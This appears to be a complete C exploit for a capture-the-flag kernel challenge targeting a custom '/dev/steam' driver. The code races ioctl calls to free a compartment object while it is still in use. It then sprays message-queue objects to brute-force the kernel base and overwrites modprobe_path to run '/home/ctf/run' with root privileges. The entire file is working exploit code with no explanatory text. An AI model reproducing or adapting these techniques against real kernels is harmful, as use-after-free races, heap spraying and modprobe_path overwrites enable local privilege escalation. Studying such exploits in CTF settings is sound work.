#include <fcntl.h>
#include <poll.h>
#include <errno.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/xattr.h>
#include <stdlib.h>

#define PAGESIZE 4096
#define ADD_ENGINE 0xc00010ff
#define ADD_COMPARTMENT 0x1337beef
#define DELETE_COMPARTMENT 0xdeadbeef
#define SHOW_ENGINE_LOG 0xcafebeef
#define UPDATE_ENGINE_LOG 0xbaadbeef

int stackfd;
id_t eid = 0;
id_t cid2;
id_t cid1[0x100];

key_t key = IPC_PRIVATE;
int msqid;

struct e_msg {
    long mtype;
    char mtext[0x10];
};

struct e_msg msg;
struct e_msg recv_msg;

typedef struct
{
    id_t id;
    char *name;
    char *desc;
    char *logs;
}req_t;

typedef struct {
    id_t id;
    int fd;
}race_t;

int success = 0;


int addcomp(int fd, char *desc, int id) {
    req_t req = {0};
    req.id = id;
    req.desc = desc;

    return ioctl(fd, ADD_COMPARTMENT, (unsigned long)&req);
}

int addeng(int fd, char *name) {
    req_t req = {0};
    req.name = name;

    return ioctl(fd, ADD_ENGINE, (unsigned long)&req);
}

int delcomp(int fd, int id) {
    req_t req = {0};
    req.id = id;

    return ioctl(fd, DELETE_COMPARTMENT, (unsigned long)&req);
}

int show(int fd, int id, char *logs) {
    req_t req = {0};
    req.id = id;
    req.logs = logs;

    return ioctl(fd, SHOW_ENGINE_LOG, (unsigned long)&req);
}

int update(int fd, int id, char *logs) {
    req_t req = {0};
    req.id = id;
    req.logs = logs;

    return ioctl(fd, UPDATE_ENGINE_LOG, (unsigned long)&req);
}

void *race(void *arg) {
    race_t *args = (void *)arg;

    int target = args->id;
    int fd = args->fd;

    char desc[0x100] = {0};

    while(!success) {
        int comp = addcomp(fd, desc, target); 
        if(comp == -1) {
            continue;
        }
        //printf("compartment id: %x tid: %ld\n", comp, syscall(SYS_gettid));

        if(show(fd, comp, desc) < 0) {
            printf("freed\n");
            success = 1;
        } else {
            delcomp(fd, comp);
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    int fd;
    char name[0x100] = {0};
    char desc[0x100] = {0};
    char logs[0x100] = {0};

    int engine = 0;
    int comps[0x200] = {0};

    struct e_msg msg;

    fd = open("/dev/steam", O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "open dev: %m\n");
        exit(1);
    }

    int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if(msqid == -1) {
        fprintf(stderr, "msgget: %m\n");
        exit(1);
    }

    memcpy(name, "eng1", sizeof("eng1"));
    engine = addeng(fd, name);
    memcpy(desc, "comp1", sizeof("comp1"));

    for(int i=0;i<254;i++) {
        comps[i] = addcomp(fd, desc, engine);
    }

    race_t target = {.fd = fd, .id = engine};

    pthread_t thread;
    pthread_create(&thread, 0, race, (void *)&(target));
    race((void *)&target);
    pthread_join(thread, NULL);

    unsigned long ptr = 0xffffffff80000000;
    msg.mtype = 1;
    while(ptr < 0xffffffffc0000000) {
        memcpy(msg.mtext, &ptr, sizeof(ptr));

        if(msgsnd(msqid, &msg, 0x10, 0) == -1) {
            fprintf(stderr, "msgsnd: %m\n");
            exit(1);
        }

        if(show(fd, comps[0], logs) == 0) {
            printf("kbase leaked: %lx\n", ptr);
            break;
        }

        if(msgrcv(msqid, &recv_msg, 0x10, 0, IPC_NOWAIT | MSG_NOERROR) < 0) {
            fprintf(stderr, "msgrcv: %m\n");
            exit(1);
        }

        ptr += 0x100000;
    }
    printf("ptr value: %lx\n", ptr);

    //free final bruteforce msg
    int rcv = msgrcv(msqid, &recv_msg, 0x10, 0, IPC_NOWAIT | MSG_NOERROR);
    printf("rcv val: %d\n", rcv);
    if(rcv < 0) {
        fprintf(stderr, "object not freed :(\n");
        exit(1);
    }

    //add modprobe_path offset to base
    ptr += 0xa231e0;

    memcpy(msg.mtext, &ptr, sizeof(ptr));
    printf("mtext value: %lx\n", *(unsigned long *)msg.mtext);

    if(msgsnd(msqid, &msg, 0x10, 0) == -1) {
        fprintf(stderr, "msgsnd: %m\n");
        exit(1);
    }

    printf("ptr: %lx\n", ptr);
    char *mod_string = "/home/ctf/run";
    memset(logs, 0, sizeof(logs));
    memcpy(logs, mod_string, strlen(mod_string)+1);
    if(update(fd, comps[0], logs) == 0) {
        printf("successful copy, modprobe_path: %lx\n", ptr);
    }

    return 0;
}
